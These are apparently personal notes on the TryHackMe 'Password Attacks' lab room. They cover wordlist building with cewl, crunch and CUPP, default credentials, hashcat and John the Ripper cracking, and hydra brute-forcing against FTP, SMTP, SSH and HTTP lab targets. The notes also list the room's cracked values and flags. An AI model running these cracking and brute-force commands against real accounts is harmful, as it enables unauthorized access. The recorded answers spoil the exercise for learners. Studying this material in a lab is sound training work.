- https://tryhackme.com/room/passwordattacks

#passwords 

 types and techniques used in password attacks.
 - Password profiling
- Password attacks techniques
- Online password attacks

Passwords are used as an authentication method for individuals to access computer systems or applications.

A collection of passwords is often referred to as a dictionary or wordlist. Passwords with low complexity that are easy to guess are commonly found in various publicly disclosed password data breaches.

Here are the top 100 and most common and seen passwords
- https://techlabuzz.com/top-100-most-common-passwords/ for your reference.

Password Attack Techniques (online)
- dictionary
- brute-force
- rule-based
- guessing attacks

PASSWORD CRACKING
- a technique used for discovering passwords from encrypted or hashed data to plaintext data.
- obtain the encrypted passwords or capture them from transmissions on the network
- local or on systems controlled by attack
- Goal: privilige escalation 

PASSWORD GUESSING
-  a method of guessing passwords for online protocols and services based on dictionaries.
- target online protocols and services
- time consuming and leaves trace in target logs, new requests for every attempt

## Password Profiling

It is important to know how you can generate username lists and password lists.

**Default Passwords**

Before performing password attacks, it is worth trying a couple of default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, routers.
- `admin:admin, admin:123456`
- if target is server Tomcat (Java app server) then `admin:admin or tomcat:admin `
website lists that provide default passwords for various products.

- https://cirt.net/passwords 
- https://default-password.info/
- https://datarecovery.com/rd/default-passwords/

**Weak Passwords**

Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements.
- https://wiki.skullsecurity.org/index.php?title=Passwords
- https://github.com/danielmiessler/SecLists/tree/master/Passwords

**Leaked Passwords**

Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach. These public or privately available leaks are often referred to as 'dumps'.
- Depending on the contents of the dump, an attacker may need to extract the passwords out of the data
- may contain only hashes
- common password lists that have weak and leaked passwords, including `webhost, elitehacker,hak5, Hotmail, PhpBB`
- https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases

COMBINED WORDLISTS
- combine many wordlists into 1 large file
```
cat file1.txt file2.txt file3.txt > combined_list.txt

# remove duplicated words

sort combined_list.txt | uniq -u > cleaned_combo_list.txt
```

CUSTOMIZED WORDLISTS
Customizing password lists is one of the best ways to increase the chances of finding valid credentials.
- can create custom password lists from the target website.
- company's website contains valuable information about the company and its employees, including emails and employee names

`cewl` tool to scrape a website
- ` cewl -w list.txt -d 5 -m 5 <url> `
- `-m 5` gathers strings (words) of length 5 characters or more
- `-d 5` depth level of web crawling
- target: ` https://clinic.thmredteam.com/ ` parse length of 8

USERNAME WORDLISTS
gather all the info from target website, example `{first name} {last name}`
- tool `username_generator` that generates possible combinations of first and last names
```
git clone https://github.com/therodri2/username_generator.git
cd username_generator
python3 username_generator.py -h

echo "John Smith" > users.lst
python3 username_generator.py -w users.lst
```

What are the default login credentials (in the format of `username:password`) for a Juniper Networks ISG 2000 device? Make sure to check the hint.
-  hint: ` https://default-password.info/juniper/isg2000 `
- ` netscreen : netscreen `

---

KEYSPACE TECHNIQUE

Another way of preparing a wordlist is by using the key-space technique. In this technique, we specify a range of characters, numbers, and symbols in our wordlist
- `crunch` tool
- `crunch [min] [max] [letters-digits] -o fileName.txt`
- `crunch 2 2 01234abcd -o crunch.txt `
- can make large files quickly so be careful
- special characters `@ lower  , upper  % numeric  ^ special chars`
- `crunch 6 6 -t pass%% `

COMMON USER PASSWORDS PROFILER (CUPP)

CUPP is an automatic and interactive tool written in Python for creating custom wordlists
- if you know specific details of target: _birthdate, pet name, company name_

```
git clone https://github.com/Mebus/cupp.git 
cd cupp
python3 cupp.py -h

python3 cupp.py -i    # interactive mode, enter for unknowns
```

`crunch 22 01234abcd -o crunch.txt ` = 81 entries

`crunch 5 5 "THM^^" -o tryhackme.txt `  = THM@%

## Offline attacks --

#### **DICTIONARY ATTACK** 
is a technique used to guess passwords by using well-known words or phrases.
- dictionary attack relies entirely on pre-gathered wordlists
- important to choose or create the best candidate wordlist for your target in order to succeed in this attack.
- hashcat

we have a hash ` f806fc5a2a0d5ba2471600758452799c `
- what type of hash is this?
- what wordlist will we use?
- what type of attack mode will be used?

use `hashid` to know what type of hash, turns out this is MD5
hashcat
`hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt `

the hash = `rockyou`

---

### **BRUTE FORCE**

Brute-forcing is a common attack used by the attacker to gain unauthorized access to a personal account. This method is used to guess the victim's password by sending standard password combinations
- brute forcing tries all combinations of a character

bank account
PIN is 4 digits
`hashcat --help`
` hashcat -a 3 ?d?d?d?d --stdout `   the `-a 3` = brute force
hash ` 05A5CF06982BA7892ED2A6D38FE832D6 `  = MD5 hash

```
hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d

# cracked MD5 hash
05a5cf06982ba7892ed2a6d38fe832d6:2021
```

`apt install hashid `
- `hashid -e -m -o hashed.txt <hash>`
- https://www.tunnelsup.com/hash-analyzer/ 

` 8d6e34f987851aa599257d3831a1af040886842f = SHA-1`

  
Perform a dictionary attack against the following hash: `8d6e34f987851aa599257d3831a1af040886842f`. 
What is the cracked value? Use `rockyou.txt` wordlist.
- hash type ` -m100 `  for SHA-1

```
hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt 

# cracked = sunshine
```

  
Perform a brute-force attack against the following MD5 hash: `e48e13207341b6bffb7fb1622282247b`. What is the cracked value? 
Note the password is a 4 digit number: `[0-9][0-9][0-9][0-9]`
```
hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d -o digits.txt

# cracked = 1337
```

---

### RULE BASED ATTACKS

Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy.
- rules applied to create passwords
- more valid passwords

John the Ripper
- config file `/etc/john/john.conf` or `/opt/john/john.conf`  `List.Rules`
- example `cat /etc/john/john.conf | grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF `

create a wordlist with password `tryhackme` and expand it with rules `best64` rule
- ` john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l `
- ` john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3" `

CUSTOM RULES
Let's say we wanted to create a custom wordlist from a pre-existing dictionary with custom modification to the original dictionary. The goal is to add special characters (ex: !@#$*&) to the beginning of each word and add numbers 0-9 at the end.
- `[symbols]word[0-9]`

```
sudo nano /etc/john/john.conf 

[List.Rules:THM-Password-Attacks] Az"[0-9]" ^[!@#$]
```

^[!@#$] add a special character at the beginning of each word. ^ means the beginning of the line/word. Note, changing ^ to $ will append the special characters to the end of the line/word.

create a file that has `password` 
`echo "password" > /tmp/single.lst`
```
john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout
```

```
Az"[0-9][0-9]" ^[**]  @password80

# What syntax would you use to create a rule to produce the following "S[Word]NN

Az"[0-9][0-9]" ^[!@]
```

target is ` http://clinic.thmredteam.com `
use `cewl` to make a wordlist
` cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/ `

` 10.10.34.6 `

Online password attacks involve guessing passwords for networked services that use a username and password authentication scheme, including services such as HTTP, SSH, VNC, FTP, SNMP, POP3, etc.

hydra

FTP
- `-l` ftp we are specifying a single username, use-L for a username wordlist
- `-P` Path specifying the full path of wordlist, you can specify a single password by using -p.
` hydra -l ftp -P passlist.txt ftp://10.10.34.6 `

SMTP
- port 25
- ` hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v`

SSH
- `hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v`

HTTP
- GET, POST
- `hydra http-get-form -U`
- `<url>:<form parameters>:<condition string>[:<optional>[:<optional>]`

```
hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f

-l admin  single username. -L wordlist
-P path   single password -p
login-get/index.php
username=^USER^&password=^PASS^
F= false positives, invalid password
S= success conditions

```

` http://10.10.34.6/login-get/index.php `

```
ftp 10.10.34.6 
anonymous
ENTER
cd files
get flag.txt 

THM{d0abe799f25738ad739c20301aed357b}

```

you need to generate a rule-based dictionary from the wordlist `clinic.lst` in the previous task. `email: pittman@clinic.thmredteam.com` against `10.10.34.6:465` (SMTPS).
password format is as follows: ` [symbol][dictionary word][0-9][0-9].`

```
Where [symbol]=[!@]

tail -f /opt/john/john.conf
[List.Rules:THM-Password-Attacks]
Az"[0-9][0-9]" ^[!@]

john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst

```

  
Perform a brute-forcing attack against the phillips account for the login page at `http://10.10.34.6/login-get` using hydra? **What is the flag?**
```
hydra -l phillips -P clinic.txt 10.10.129.191 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f

# THM{33c5d4954da881814420f3ba39772644}
```

  
Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: `http://10.10.34.6/login-post/`. What is the flag?

Note: use the `clinic.lst` dictionary in generating and expanding the wordlist!

- ` THM{f8e3750cc0ccbb863f2706a3b2933227} `

## Password Spraying

SSH

NEED TO REDO THIS ROOM

Perform a password spraying attack to get access to the `SSH://10.10.34.6` server to read` /etc/flag`. **What is the flag?**

- ` THM{a97a26e86d09388bbea148f4b870277d} `

Reference
---
- https://www.cyb3rm3.com/pa55w0rdattack5